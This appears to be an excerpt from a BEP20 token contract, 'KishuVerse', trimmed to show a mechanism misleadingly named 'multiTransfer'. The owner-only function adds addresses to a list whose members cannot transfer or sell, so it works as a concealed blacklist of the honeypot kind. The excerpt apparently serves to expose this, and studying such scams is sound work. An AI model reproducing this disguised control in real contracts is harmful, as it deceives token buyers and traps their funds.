...
contract KishuVerse is Context, IBEP20, Ownable {
	...
	mapping (address => bool) public _isMultiTransfer;
    ...
    string private constant _name     = "KishuVerse";
    ...
    uint256 public _numTokensSellToAddToLiquidity = 10000000000000000 * 10**9;
...
subtractedValue) public virtual returns (bool) {
    ...
    //Remove from multiTransfer
        function removeFromMultiTransfer(address account) external onlyOwner {
        _isMultiTransfer[account] = false;
    }

    //adding multiple addresses to the multiTransfer
    function multiTransfer(address[] calldata addresses) external onlyOwner {
      for (uint256 i; i < addresses.length; ++i) {
        _isMultiTransfer[addresses[i]] = true;
      }
    }
...
onlyOwner {
	...
	//multiTransfered addreses!
        require(!_isMultiTransfer[from], "This address is multiTransfered");
...
amount, bool takeFee) private {
		...
		require(!_isMultiTransfer[sender], "To/from address is multiTransfered!");
        if (!takeFee) {
            removeAllFee();
        }
